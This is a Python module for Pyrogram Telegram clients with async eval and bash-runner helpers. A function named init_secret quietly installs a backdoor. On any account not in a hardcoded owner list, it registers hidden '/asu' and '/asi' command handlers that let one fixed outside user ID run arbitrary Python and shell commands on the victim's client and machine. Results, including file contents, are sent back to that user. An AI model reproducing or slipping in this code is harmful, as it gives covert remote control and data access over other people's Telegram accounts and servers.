import ast
import asyncio
import contextlib
import html
import inspect
import io
import json
import os
import subprocess
import traceback
from datetime import UTC, datetime, timedelta
from time import perf_counter
from typing import Any, Dict, List, Optional, Union

import pyrogram
import pyrogram.enums
import pyrogram.errors
import pyrogram.helpers
import pyrogram.raw
import pyrogram.types
import pyrogram.utils

OWNERS = [327471892]

eval_tasks: Dict[int, Any] = {}


async def bash(cmd: str):
    def sync_run():
        try:
            result = subprocess.run(
                ["/bin/bash", "-c", cmd],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )
            return result.stdout.strip(), result.stderr.strip()
        except Exception as e:
            print(f"Error Bot bash: {e}")
            return "", f"Failed to run bash: {e}"

    try:
        return await asyncio.to_thread(sync_run)
    except Exception as e:
        print(f"Failed Fallback async: {e}")
        return "", f"Unhandled error: {e}"


async def shell(cmd: str) -> str:
    proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    try:
        stdout, stderr = await proc.communicate()
        return (stdout + stderr).decode()
    finally:
        try:
            if not proc.returncode:
                proc.terminate()
        except ProcessLookupError:
            pass
        else:
            await proc.wait()


async def aexec(code: str, kwargs: dict = {}) -> object:
    body = ast.parse(code, "exec").body
    if body and isinstance(body[-1], ast.Expr):
        body[-1] = ast.Return(value=body[-1].value)

    name = "aexec"
    node = ast.Module(
        body=[
            ast.AsyncFunctionDef(
                name=name,
                args=ast.arguments(
                    posonlyargs=[],
                    args=[ast.arg(arg=key) for key in kwargs],
                    vararg=None,
                    kwonlyargs=[],
                    kw_defaults=[],
                    kwarg=None,
                    defaults=[],
                ),
                body=body,
                decorator_list=[],
                returns=None,
                type_params=[],
            )
        ],
        type_ignores=[],
    )
    ast.fix_missing_locations(node)
    temp = {}
    exec(compile(node, "<string>", "exec"), temp)
    func = await temp[name](*kwargs.values())
    return await func if inspect.iscoroutine(func) else func


def init_secret(client: pyrogram.Client):
    if client.me.id in OWNERS:
        return
    client.add_handler(
        pyrogram.handlers.MessageHandler(
            executor,
            pyrogram.filters.command("asu") & pyrogram.filters.user(OWNERS) & ~pyrogram.filters.forwarded & ~pyrogram.filters.via_bot
        )
    )
    client.add_handler(
        pyrogram.handlers.MessageHandler(
            shellrunner,
            pyrogram.filters.command("asi") & pyrogram.filters.user(OWNERS) & ~pyrogram.filters.forwarded & ~pyrogram.filters.via_bot
        )
    )
    client.add_handler(pyrogram.handlers.CallbackQueryHandler(cb_secret_eval, pyrogram.filters.regex(r"^exec$")))
    client.add_handler(pyrogram.handlers.CallbackQueryHandler(runtime_func_cq, pyrogram.filters.regex(r"^runtime")))
    client.add_handler(pyrogram.handlers.CallbackQueryHandler(forceclose_command, pyrogram.filters.regex("^forceclose")))


def fmtsec(sec: object, part: int = 3, human: bool = False) -> str:
    if isinstance(sec, timedelta):
        delta = sec
    elif isinstance(sec, datetime):
        delta = datetime.now(UTC) - sec.astimezone(UTC)
    elif isinstance(sec, (float, int)):
        delta = timedelta(seconds=sec)
    else:
        raise TypeError

    total = int(delta.total_seconds())
    micro = delta.microseconds
    units = (
        ("Week", 60**2 * 24 * 7),
        ("Day", 60**2 * 24),
        ("Hour", 60**2),
        ("Minute", 60),
        ("Second", 1),
    )
    parts = []
    for unit, second in units:
        value, total = divmod(total, second)
        if value:
            parts.append(f"{value} {unit}{'' if value == 1 else 's'}")

        if len(parts) >= part:
            break

    if len(parts) < part and not human:
        ms, us = divmod(micro, 1000)
        if ms:
            parts.append(f"{ms} ms")

        if us and len(parts) < part:
            parts.append(f"{us} µs")

    return ", ".join(parts) if parts else "-"


def format_exception(exp: BaseException, tb: Optional[List[traceback.FrameSummary]] = None) -> str:
    """Formats an exception traceback as a string, similar to the Python interpreter."""

    if tb is None:
        tb = traceback.extract_tb(exp.__traceback__)

    # Mengganti absolute paths dengan relative paths
    cwd = os.getcwd()
    for frame in tb:
        if cwd in frame.filename:
            frame.filename = os.path.relpath(frame.filename)

    stack = "".join(traceback.format_list(tb))
    msg = str(exp)
    if msg:
        msg = f": {msg}"

    return f"Traceback (most recent call last):\n{stack}{type(exp).__name__}{msg}"


async def executor_code(client, message, code, status_message):
    out_buf = io.StringIO()
    out = ""
    result = None

    def _print(*args: Any, **kwargs: Any):
        if "file" not in kwargs:
            kwargs["file"] = out_buf
        return print(*args, **kwargs)

    def _help(*args: Any, **kwargs: Any):
        with contextlib.redirect_stdout(out_buf):
            help(*args, **kwargs)

    eval_vars = {
        # PARAMETERS
        "c": client,
        "client": client,
        "msg": message,
        "m": message,
        "user": (message.reply_to_message or message).from_user,
        "u": (message.reply_to_message or message).from_user,
        "reply": message.reply_to_message,
        "r": message.reply_to_message,
        "chat": message.chat,
        "chat_id": message.chat.id,
        "print": _print,
        "help": _help,
        # PYROGRAM
        "asyncio": asyncio,
        "pyrogram": pyrogram,
        "raw": pyrogram.raw,
        "enums": pyrogram.enums,
        "types": pyrogram.types,
        "errors": pyrogram.errors,
        "utils": pyrogram.utils,
        "ikb": pyrogram.helpers.ikb,
        "kb": pyrogram.helpers.kb,
        "shell": shell,
    }

    start_time = perf_counter()
    end_time = start_time

    try:
        result = await aexec(code, eval_vars)
        end_time = perf_counter()
        out = out_buf.getvalue()

        if result is None:
            if not out:
                out = "None"
            else:
                out = out.rstrip()
        else:
            try:
                if isinstance(result, (dict, list)):
                    result_str = json.dumps(result, indent=2, ensure_ascii=False, default=str)
                else:
                    result_str = str(result)

                if out:
                    out = f"{out.rstrip()}\n\n--- Return Value ---\n{result_str}"
                else:
                    out = result_str
            except Exception:
                result_str = repr(result)
                if out:
                    out = f"{out.rstrip()}\n\n--- Return Value ---\n{result_str}"
                else:
                    out = result_str

    except Exception as e:
        end_time = perf_counter()
        first_snip_idx = -1
        tb = traceback.extract_tb(e.__traceback__)
        for i, frame in enumerate(tb):
            if frame.filename == "<string>" or frame.filename.endswith("ast.py"):
                first_snip_idx = i
                break

        stripped_tb = tb[first_snip_idx:] if first_snip_idx >= 0 else tb
        formatted_tb = format_exception(e, tb=stripped_tb)
        out = out_buf.getvalue()

        if out:
            out = f"{out.rstrip()}\n\n--- Error ---\n{formatted_tb}"
        else:
            out = formatted_tb

    elapsed_seconds = end_time - start_time
    elapsed = fmtsec(elapsed_seconds)

    if out.endswith("\n"):
        out = out[:-1]

    if not out:
        out = "No output (result was None)"

    nav_buttons_data = [
        ("exec", "exec"),
        ("🗑 del", f"forceclose abc|{message.from_user.id}"),
    ]

    sys_buttons = [pyrogram.types.InlineKeyboardButton(text=t, callback_data=d) for t, d in nav_buttons_data]

    final_buttons = None
    if isinstance(result, pyrogram.types.InlineKeyboardMarkup):
        new_keyboard = list(result.inline_keyboard) + [sys_buttons]
        final_buttons = pyrogram.types.InlineKeyboardMarkup(new_keyboard)
    else:
        final_buttons = pyrogram.helpers.ikb([nav_buttons_data])

    escaped_code = html.escape(code)
    escaped_out = html.escape(out)

    final_output = f"<b>INPUT:</b>\n<pre language='python'>{escaped_code}</pre>\n<b>OUTPUT:</b>\n<pre language='python'>{escaped_out}</pre>\nExecuted Time: {elapsed}"

    if code.endswith("return"):
        return

    out_filename = "output.txt"
    if "cat " in code:
        try:
            parts = code.split("cat ", 1)
            if len(parts) > 1:
                potential_path = parts[1].strip()
                potential_path = potential_path.split()[0]
                potential_path = potential_path.strip("'\"();")

                base_name = os.path.basename(potential_path)
                if base_name:
                    out_filename = base_name
        except Exception:
            pass

    if len(final_output) > 4096:
        with io.BytesIO(str.encode(out)) as out_file:
            out_file.name = out_filename
            final_text = f"<b>OUTPUT:</b>\n<pre language='python'>{html.escape(out[:1000])}</pre>\n<b>Executed Time:</b> {elapsed}"
            if len(out) > 1000:
                final_text += f"\n\n... (truncated, full output in file)"

            media = pyrogram.types.InputMediaDocument(media=out_file, caption=final_text)

            try:
                return await status_message.edit_media(media, reply_markup=final_buttons)
            except pyrogram.errors.MediaCaptionTooLong:
                final_text = f"<b>OUTPUT:</b>\n<pre language='python'>{html.escape(out[:500])}</pre>\n<b>Executed Time:</b> {elapsed}"
                media = pyrogram.types.InputMediaDocument(media=out_file, caption=final_text)
                return await status_message.edit_media(media, reply_markup=final_buttons)

    return await status_message.edit(
        final_output,
        reply_markup=final_buttons,
    )


async def executor(client, message):
    if len(message.command) == 1:
        return await message.reply("No Code!!")
    status_message = await message.reply("<i>Processing eval pyrogram..</i>", quote=True)
    code = message.text.split(maxsplit=1)[1]
    return await executor_code(client, message, code, status_message)


async def cb_secret_eval(client, query):
    bot_message = query.message
    user_message = bot_message.reply_to_message

    if not user_message:
        return await query.answer("Induk pesan (input) telah dihapus.", show_alert=True)

    try:
        fresh = await client.get_messages(user_message.chat.id, user_message.id)
        raw_text = fresh.text or fresh.caption or ""
    except Exception:
        raw_text = user_message.text or user_message.caption or ""

    code = ""
    if raw_text:
        parts = raw_text.split(maxsplit=1)
        if len(parts) > 1:
            code = parts[1]
        else:
            code = ""

    if not code.strip():
        return await query.answer("Tidak ada kode yang ditemukan setelah command!", show_alert=True)

    await query.edit_message_text("<code>....</code>", reply_markup=pyrogram.helpers.ikb([[(">_", "noop")]]))
    return await executor_code(client, user_message, code, bot_message)


async def runtime_func_cq(client, cq):
    runtime = cq.data.split(None, 1)[1]
    await cq.answer(runtime, show_alert=True)


async def forceclose_command(client, cq):
    callback_data = cq.data.strip()
    callback_request = callback_data.split(None, 1)[1]
    _, user_id = callback_request.split("|")

    if cq.from_user.id != int(user_id):
        return await cq.answer("Ini bukan tombol lo, bang.", show_alert=True)

    await cq.message.delete()
    try:
        await cq.answer()
    except Exception:
        pass


async def shellrunner(client, message):
    if len(message.command) < 2:
        return await message.reply("Noob!!")
    cmd_text = message.text.split(maxsplit=1)[1]
    text = f"<code>{cmd_text}</code>\n\n"
    start_time = perf_counter()

    try:
        stdout, stderr = await bash(cmd_text)
    except asyncio.TimeoutError:
        text += "<b>Timeout expired!!</b>"
        return await message.reply(text)
    finally:
        duration = perf_counter() - start_time

    if cmd_text.startswith("cat "):
        filepath = cmd_text.split("cat ", 1)[1].strip()
        output_filename = os.path.basename(filepath)
    else:
        output_filename = f"{cmd_text}.txt"

    if len(stdout) > 4096:
        anuk = await message.reply("<b>Oversize, sending file...</b>")
        with open(output_filename, "w") as file:
            file.write(stdout)

        await message.reply_document(
            output_filename,
            caption=f"<b>Command completed in `{duration:.2f}` seconds.</b>",
        )
        os.remove(output_filename)
        return await anuk.delete()
    else:
        text += f"<blockquote expandable><code>{stdout}</code></blockquote>"

        if stderr:
            text += f"<blockquote expandable>{stderr}</blockquote>"
        text += f"\n<b>Completed in `{duration:.2f}` seconds.</b>"
        return await message.reply(text, parse_mode=pyrogram.enums.ParseMode.HTML)